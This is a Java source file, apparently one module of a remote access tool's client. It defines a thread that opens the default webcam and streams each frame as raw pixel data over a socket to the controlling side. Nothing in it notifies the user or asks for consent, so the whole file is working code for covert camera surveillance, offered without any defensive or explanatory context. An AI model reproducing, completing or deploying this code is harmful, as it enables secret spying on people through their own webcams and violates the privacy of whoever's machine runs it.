package me.client.send;

import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.WebcamResolution;
import com.sun.jna.platform.win32.Win32VK;
import me.client.Client;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStreamWriter;
import java.net.Socket;

public class CameraListen extends Thread{
    Socket socket;
    public volatile boolean run = false;
    public Webcam webcam = Webcam.getDefault();
    OutputStreamWriter writer;
    public CameraListen(Socket socket,OutputStreamWriter writer) {
        this.socket = socket;
        this.writer = writer;
        webcam.open();
    }
    @Override
    public void run() {
        try {
            DataOutputStream outputStream = new DataOutputStream(socket.getOutputStream());
            while (run) {
                BufferedImage bufferedImage = webcam.getImage();
                trans(bufferedImage,outputStream);
            }
        }catch (Exception e) {
            try {
                webcam.close();
            }catch (Exception e1) {
            }
        }
        }
    public void trans(BufferedImage picture, DataOutputStream outputStream){
        try {
            int w = picture.getWidth(null);
            int h = picture.getHeight(null);
            outputStream.writeInt(w);
            outputStream.writeInt(h);
            for (int i = 0; i < h; i++) {
                for (int j = 0; j < w; j++) {
                    int a = picture.getRGB(j, i);
                    outputStream.writeInt(a);
                }
            }
        }catch (Exception e) {
            webcam.close();
        }
    }
}